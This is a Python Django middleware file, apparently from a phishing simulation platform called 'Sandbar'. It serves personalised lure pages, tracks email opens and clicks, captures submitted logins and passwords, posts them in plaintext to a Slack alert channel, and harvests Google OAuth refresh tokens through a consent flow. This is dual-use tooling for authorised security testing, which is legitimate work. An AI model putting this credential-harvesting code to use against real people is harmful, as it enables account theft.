# -*- coding: utf-8 -*-
import os
import re
import json
import logging
from io import open as io_open
from urlparse import urlparse

from client.models import (SlackHook, Engagement, ResultEvent, Target,
                           TargetDatum, VectorEmail, OAuthEngagement,
                           OAuthResult)
from client.slack_api import send_slack_message
from oauth2client.client import OAuth2WebServerFlow

from django.conf import settings
from django.shortcuts import render
from django.db.models import Q
from django.http.response import HttpResponse, HttpResponseRedirect
from django.utils import timezone as dj_tz

logger = logging.getLogger(__name__)


def get_oauth_engagement_by_url(url):
    ''' Return the first OAuthEngagement with an OAuthConsumer using a
    callback_url matching the supplied url, or None if none are found. '''
    if url.find('/1x1.png') != -1:
        url = url[:url.find('/1x1.png')]
    return OAuthEngagement.objects.filter(oauth_consumer__callback_url=url).\
                                   order_by('id').last()


def get_engagement_by_url(url, remove_referral_id=True):
    '''
    Return the first Engagement or OAuthEngagement with a `url` matching the
    supplied `url` minus the 1x1.png segment found in tracking images, or None
    if none are found.

    If remove_referral_id is False, the path segment corresponding to a
    referral ID will not be removed before attempting to match an Engagement.
    '''
    # The protocol is required by urlparse and not by the engagement URL.
    parsed = urlparse('https://{}'.format(url))
    domain = parsed.netloc
    path = parsed.path.strip('/')
    segmented_path = split_and_clean_url(path)

    if '1x1.png' in segmented_path:
        segmented_path.remove('1x1.png')
        is_tracking_image = True
    else:
        is_tracking_image = False

    if remove_referral_id:
        if len(segmented_path) == 0:
            pass
        elif len(segmented_path) == 1:
            segmented_path.pop(-1)
        else:
            segmented_path.pop(-2)

    path = '/'.join(segmented_path)

    if parsed.query:
        path += '?{}'.format(parsed.query)

    engagement = Engagement.objects.filter(
        Q(domain__domain_name=domain, path='%s/' % path) |
        Q(domain__domain_name=domain, path=path)
    ).order_by('id').last()

    # This query only needs to be run if the link is a tracking image.
    # Including it for other requests might eventually slow response times.
    if engagement is None and is_tracking_image is True:
        dereffed_http_url = 'http://{}/{}'.format(domain, path)
        dereffed_ssl_url = 'https://{}/{}'.format(domain, path)
        engagement = OAuthEngagement.objects.filter(
            Q(oauth_consumer__callback_url='%s/' % dereffed_http_url) |
            Q(oauth_consumer__callback_url=dereffed_http_url) |
            Q(oauth_consumer__callback_url='%s/' % dereffed_ssl_url) |
            Q(oauth_consumer__callback_url=dereffed_ssl_url)
        ).order_by('id').last()

    return engagement


def split_and_clean_url(url):
    '''
    Split the `url` string by forward slashes, remove any empty strings in
    the resulting list, and return it.
    '''
    segmented_path = url.split('/')
    return [segment for segment in segmented_path if segment != '']


def separate_referral_id(url):
    '''
    Return the first referral ID found in the supplied `url` string, if one
    is present; otherwise, return None.
    '''

    # Query parameters should be removed since they are allowed to use slashes.
    if url.find('?') > -1:
        url = url[:url.find('?')]

    segmented_url = split_and_clean_url(url)

    if '1x1.png' in segmented_url:
        segmented_url = segmented_url[:-1]

    if len(segmented_url) < 2:
        referral_id = segmented_url[-1]
    else:
        referral_id = segmented_url[-2]

    return referral_id


def fqdn_matches_host(request):
    # Block non-SSL for all attempted connections to Sandbar's operator views.
    protocol = request.META.get('wsgi.url_scheme', 'https')
    domain = request.META['HTTP_HOST']
    if not request.is_secure():
        return False
    return (protocol + '://' + domain == 'https://' + settings.HOST)


def record_result_event(request, target, engagement, event_type,
                        login=None, password=None, raw_data=None):
    ''' Record a ResultEvent of `event_type` made by `target` for `engagement`.

    If no VectorEmail exists for `target` in `engagement`, raise
    VectorEmail.DoesNotExist. '''

    vector_email_for_target_in_engagement = VectorEmail.objects.\
                                                  filter(target=target,
                                                         engagement=engagement)

    if vector_email_for_target_in_engagement.count() != 1:
        logger.info('record_result_event failed\n    count {}\n    Target {}\n'
                    '    Engagement {}\n    event_type {}\n    raw_data: {}'
                    ''.format(vector_email_for_target_in_engagement.count(),
                              target.id, engagement.id, event_type, raw_data))
        raise VectorEmail.DoesNotExist
    else:
        vector_email = vector_email_for_target_in_engagement.get()
        vector_email.result_event.create(
            event_type=event_type,
            userAgent=request.META['HTTP_USER_AGENT'],
            ip=request.META['REMOTE_ADDR'],
            timestamp=dj_tz.now(),
            login=login,
            password=password,
            raw_data=raw_data
        )
        vector_email.save()


def replace_shortcodes(page_source, engagement, target):
    protocol = engagement.domain.protocol
    target_dict = dict()
    target_dict['email'] = target.email
    target_dict['firstname'] = target.firstname
    target_dict['lastname'] = target.lastname
    target_dict['timezone'] = target.get_timezone()

    target_lists = target.targetlist_set.filter(engagement=engagement)

    for target_list in target_lists:
        for item in TargetDatum.objects.filter(target=target,
                                               target_list=target_list):
            target_dict.update({item.label: item.value})

    for key, val in target_dict.iteritems():
        if key and val:
            pattern = r"\[\#\[" + '{}'.format(key) + r"\]\#\]"
            page_source = re.sub(pattern, val, page_source)
    page_source = re.sub(r"\[\#\[\w+\]\#\]", '', page_source)
    page_source = re.sub(r"(?:src=)(\'|\"|)(?:\/|)(images)",
                         'src=\g<1>%s://%s/\g<2>' % (protocol, settings.HOST),
                         page_source)
    return page_source


def serve_landing_page(request, target, engagement):
    with io_open(engagement.landing_page.path, 'r', encoding='utf-8') as f:
        page_source = f.read()

    page_source = replace_shortcodes(page_source, engagement, target)

    return render(request, 'index.html', {'soup': page_source})


def serve_redirect_page(request, target, engagement):
    page_source = None
    try:
        redirect_page = engagement.redirect_page
        if redirect_page.status == 2:
            return render(request, 'external_404.html', status=404)

        with io_open(redirect_page.path, 'r', encoding='utf-8') as f:
            page_source = f.read()

        page_source = replace_shortcodes(page_source, engagement, target)

    except Exception as e:
        logger.info('[ ! ] Could not serve redirect page: {}'.format(e))
        response = render(request, 'external_404.html', status=404)

    if page_source is None:
        response = render(request, 'external_404.html', status=404)
    else:
        response = render(request, 'index.html', {'soup': page_source})

    return response


def serve_tracking_image_or_404(request):
    try:
        with open(os.path.join(settings.BASE_DIR, 'static',
                               'img', 'px.png'), "rb") as f:
            return HttpResponse(f.read(), content_type="image/png")
    except IOError:
        logger.info('Can\'t load /static/img/px.png')
        return render(request, 'external_404.html', status=404)


def save_credentials(request):
    ref = request.COOKIES.get('ref', None)
    eng_id = request.COOKIES.get('engagement_id', None)
    login = request.POST.get('sb_login', '')
    password = request.POST.get('sb_password', '')
    raw_data = json.dumps(request.POST)

    try:
        if 'sb_login' not in raw_data and 'sb_password' not in raw_data:
            url = request.META['HTTP_HOST'] + request.get_full_path()
            logger.debug('LandingPage POST lacks sb_login or sb_password.\n'
                         '    url: {}\n    ref: {}\n    eng_id: {}\n'
                         '    raw_data: {}'.format(url, ref, eng_id, raw_data))
            raise ValueError

        engagement = Engagement.objects.get(id=eng_id)
        target_id = Target.decrypt_id(engagement.url_key, ref)
        target = Target.objects.get(id=target_id)
        record_result_event(request, target, engagement, ResultEvent.SUBMIT,
                            login=login, password=password, raw_data=raw_data)

        try:
            slack_hook = SlackHook.objects.last()
            link = 'https://{}/engagements/edit/{}/'.format(settings.HOST,
                                                            eng_id)
            text = '\n'.join([
                '<!here> - :rotating_light: _*CRED ALERT*_ :rotating_light:',
                '```#####################',
                str(engagement.campaign.client.name),
                str(engagement.name),
                str(link),
                '{} {}'.format(target.firstname, target.lastname),
                str(target.email),
                '------------------------------',
                re.sub(r'{{login}}', login, '{{login}}'),
                re.sub(r'{{password}}', password, '{{password}}'),
                '#####################```'
            ])
            send_slack_message('#sandbar-alerts', 'Sandbar',
                               ':fishing_pole_and_fish:', text, slack_hook)
        except Exception as e:
            message = '[ ! ] Error attempting to send Slack message: {}'
            logger.warn(message.format(e))

        if engagement.redirect_page.page_type != 'url':
            return serve_redirect_page(request, target, engagement)
        else:
            return HttpResponseRedirect(engagement.redirect_page.url)

    except (ValueError, Engagement.DoesNotExist,
            Target.DoesNotExist, VectorEmail.DoesNotExist):
        redirect_url = request.POST.get('r', None)
        if redirect_url is None:
            return render(request, 'external_404.html', status=404)
        else:
            return HttpResponseRedirect(redirect_url)


def oauth_callback(request):
    protocol = request.META.get('wsgi.url_scheme', 'https')
    domain = request.META['HTTP_HOST']  # 'glasscloor.com'
    url_path = request.get_full_path()  # '/engagement_path/ref?queries=..'
    full_url = '{}://{}{}'.format(protocol, domain, url_path)
    queryless_url = full_url[:full_url.find('?')]

    # Errors might not necessarily indicate failure.
    if request.GET.get('error', None) is not None:
        logger.warn('[ ! ] OAuth request returned with an error:'
                    '\n    {}'.format(full_url))

    oauth_engagement = get_oauth_engagement_by_url(queryless_url)
    if oauth_engagement is None:
        logger.warn('[ ! ] OAuth request does not match any OAuthConsumer:'
                    '\n    {}'.format(queryless_url))
        engagement = None
        target = None
    else:
        oauth_consumer = oauth_engagement.oauth_consumer
        engagement = oauth_engagement.engagement_ptr
        # Can't put `ref` in the redirect URI -- have to use `state`.
        # Reference: http://stackoverflow.com/a/7722099
        ref = request.GET['state']
        target_id = Target.decrypt_id(engagement.url_key, ref)
        target = Target.objects.get(id=target_id)

    access_code = request.GET.get('code', None)
    # Missing an access token indicates authorization denial.
    if access_code is None:
        return HttpResponseRedirect(oauth_consumer.bounce_url)

    scope = oauth_consumer.scope.split('+')
    if 'email' not in scope:
        scope.append('email')

    flow = OAuth2WebServerFlow(client_id=oauth_consumer.client_id,
                               client_secret=oauth_consumer.client_secret,
                               scope=scope,
                               redirect_uri=oauth_consumer.callback_url,
                               access_type='offline',
                               prompt='consent')
    credentials = flow.step2_exchange(access_code)

    email = credentials.id_token.get('email', None)
    if email is None:
        email = 'EMAIL_NOT_PROVIDED'

    oauth_result = OAuthResult(timestamp=dj_tz.now(),
                               userAgent=request.META['HTTP_USER_AGENT'],
                               ip=request.META['REMOTE_ADDR'],
                               oauth_engagement=oauth_engagement,
                               target=target,
                               email=email,
                               consumer=oauth_consumer,
                               credentials=credentials)
    oauth_result.save()

    OAuthResult.objects.filter(oauth_engagement=oauth_engagement,
                               target__email=target.email,
                               email=email,
                               consumer=oauth_consumer).\
                        exclude(id=oauth_result.id).\
                        delete()

    if not credentials.refresh_token:
        logger.info('[ ! ] Access accepted but refresh token not received for'
                    ' OAuthResult #{}'.format(oauth_result.id))

    return HttpResponseRedirect(oauth_consumer.bounce_url)


class ShowLandingPage(object):

    def process_response(self, request, dresponse):

        domain = request.META['HTTP_HOST']  # 'glasscloor.com'
        url_path = request.get_full_path()  # '/engagement_path/ref?queries=..'
        url = '%s%s' % (domain, url_path)

        if dresponse.status_code == 302:
            try:
                engagement = get_engagement_by_url(url)
                ref = separate_referral_id(url_path)
                target_id = Target.decrypt_id(engagement.url_key, ref)
                target = Target.objects.get(id=target_id)
                response = serve_landing_page(request, target, engagement)
                return response
            except TypeError:
                return render(request, 'in_process.html', {})
            except:
                # Since this exception block is entered if an Engagement can't
                # be found (it causes an AttributeError), this should permit
                # intra-Sandbar 302s. In order to prevent exploration of
                # Sandbar's 302 URLs, this should not return dresponse until
                # the hostname is determined to be Sandbar's hostname, below.
                pass

        elif dresponse.status_code == 404:
            try:
                # # # # OAuth requests # # # #
                # All Google OAuth requests will be returned with a state query
                # regardless of success or failure.
                if request.GET.get('state', None) is not None:
                    return oauth_callback(request)

                # # # # Non-OAuth requests # # # #
                elif url_path.find('/api/v') != -1:
                    if not fqdn_matches_host(request):
                        return render(request, 'external_404.html', status=404)
                    return dresponse
                elif request.method == 'POST':
                    return save_credentials(request)
                elif url_path.find('/1x1') > -1:
                    event_type = ResultEvent.OPEN
                else:
                    event_type = ResultEvent.CLICK

                engagement = get_engagement_by_url(url)

                ref = separate_referral_id(url_path)
                target_id = Target.decrypt_id(engagement.url_key, ref)
                target = Target.objects.get(id=target_id)

                record_result_event(request, target,
                                    engagement, event_type)

                if event_type == ResultEvent.OPEN:
                    return serve_tracking_image_or_404(request)
                else:
                    response = serve_landing_page(request, target, engagement)
                    response.set_cookie('ref', ref)
                    response.set_cookie('engagement_id', engagement.id)
                    return response

            except:
                return render(request, 'external_404.html', status=404)

        # This prevents non-LandingPages from being served to anyone viewing
        # Sandbar via a proxy host (or incorrect protocol).
        # Must come after the above checks for whether to serve a landing page.
        if not fqdn_matches_host(request):
            return render(request, 'external_404.html', status=404)

        # Serve a 404 if the host is correct but the user is not authenticated:
        if dresponse.status_code == 403:
            return render(request, 'external_404.html', status=404)

        # Serve a Sandbar internal page instead of a LandingPage.
        return dresponse
